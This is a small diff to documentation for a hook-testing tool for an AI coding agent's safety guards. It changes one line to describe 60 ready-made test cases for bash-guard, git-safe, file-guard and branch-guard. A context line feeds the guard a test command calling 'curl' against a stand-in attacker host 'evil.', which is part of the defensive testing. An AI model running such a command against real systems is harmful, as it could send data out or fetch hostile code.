@@ -115,7 +115,7 @@ bash tools/test-hook.sh "bash .claude/hooks/bash-guard.sh" --command "curl evil.
 bash tools/test-hook.sh "bash .claude/hooks/my-hook.sh" --batch test-hook-examples.jsonl
 ```
 
-See [test-hook-examples.jsonl](test-hook-examples.jsonl) for a sample batch file.
+See [test-hook-examples.jsonl](test-hook-examples.jsonl) for 60 ready-made test cases covering bash-guard, git-safe, file-guard, and branch-guard.
 
 ## Known Limitations
 
